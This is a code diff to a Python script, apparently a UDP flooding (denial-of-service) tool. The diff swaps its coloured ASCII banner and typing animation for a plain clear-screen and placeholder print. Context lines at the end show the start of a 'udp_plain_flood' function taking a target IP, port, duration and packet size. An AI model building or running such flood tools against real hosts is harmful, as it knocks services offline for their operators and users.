@@ -11,48 +11,12 @@ init(autoreset=True)
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 
-# ============================
-#   Typing Animation
-# ============================
-def typewriter(text, delay=0.002):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()  # newline
+os.system("clear")
+print("""
+########
+#######
+""")
 
-# ============================
-#   Banner ASCII
-# ============================
-def display_header():
-    header_lines = [
-        Fore.GREEN + "══════════════════════════════════════════════════════════════════════════",     
-        Fore.YELLOW + " ██████▒▒   ██▒▒                 ██████▒▒ ██▒▒   ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒  ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒ ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒        " + Fore.RED + "█▒▒     " + Fore.YELLOW + "██▒▒      ██▒▒██▒▒",
-        Fore.YELLOW + " █████▒▒    ██▒▒       " + Fore.RED + "███▒▒    " + Fore.YELLOW + "██▒▒      ██▒██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒      " + Fore.RED + "██▒██▒▒   " + Fore.YELLOW + "██▒▒      ██▒▒██▒▒ ",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒     " + Fore.RED + "██▒▒ ██▒▒  " + Fore.YELLOW + "██▒▒      ██▒▒ ██▒▒",
-        Fore.YELLOW + " ██████▒▒   ██████▒▒" + Fore.RED + "██▒▒   ██▒▒  " + Fore.YELLOW + "██████▒▒ ██▒▒   ██▒▒",
-        Fore.RED + "                   ██▒▒     ██▒▒    " + Fore.GREEN + "███████▒▒  ████▒▒     ████▒██▒▒       ██▒▒",
-        Fore.RED + "                  ████████▒▒ ██▒▒   " + Fore.GREEN + "██▒▒   ██▒▒██▒██▒▒   ██▒██▒▒██▒▒     ██▒▒",
-        Fore.RED + "                 ██▒▒         ██▒▒  " + Fore.GREEN + "██▒▒   ██▒▒██▒▒██▒▒ ██▒▒██▒▒ ██▒▒   ██▒▒",
-        Fore.RED + "                ██▒▒           ██▒▒ " + Fore.GREEN + "██▒▒   ██▒▒██▒▒ ██▒██▒▒ ██▒▒  ██▒▒ ██▒▒",
-        Fore.RED + "               ██▒▒             ██▒▒" + Fore.GREEN + "██▒▒   ██▒▒██▒▒  ███▒▒  ██▒▒   ██▒██▒▒",
-        Fore.GREEN + "                                    ██████▒▒   ██▒▒   ██▒▒  ██▒▒    ███▒▒",
-        Fore.GREEN + "                                    ██▒▒ ██▒▒  ██▒▒         ██▒▒     ██▒▒",
-        Fore.GREEN + "                                    ██▒▒   ██▒▒██▒▒         ██▒▒     ██▒▒",
-        Fore.RED + "    █████▒▒  ███▒▒   ██▒▒   ██▒▒ █▒▒  █▒▒ ██▒▒ █▒▒ █▒▒███████▒▒ █▒▒   █▒▒",
-        Fore.RED + "   █▒▒      █▒▒  █▒▒ █▒█▒▒ █▒█▒▒ █▒▒  █▒▒ █▒█▒▒█▒▒ █▒▒   █▒▒     █▒▒ █▒▒",
-        Fore.WHITE + "   █▒▒      █▒▒  █▒▒ █▒▒█▒█▒▒█▒▒ █▒▒  █▒▒ █▒▒█▒█▒▒ █▒▒   █▒▒      ██▒▒",
-        Fore.WHITE + "    ████▒▒   ███▒▒   █▒▒██▒▒ █▒▒  ███▒▒   █▒▒ ██▒▒ █▒▒   █▒▒       █▒▒",
-        Fore.YELLOW + "════════════════════════════════════════════════════════════════════════════",     
-    ]
-    for line in header_lines:
-        print(line)
-        time.sleep(0.0015)  # typing effect
-        
 # UDP Flood Methods
 def udp_plain_flood(ip, port, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
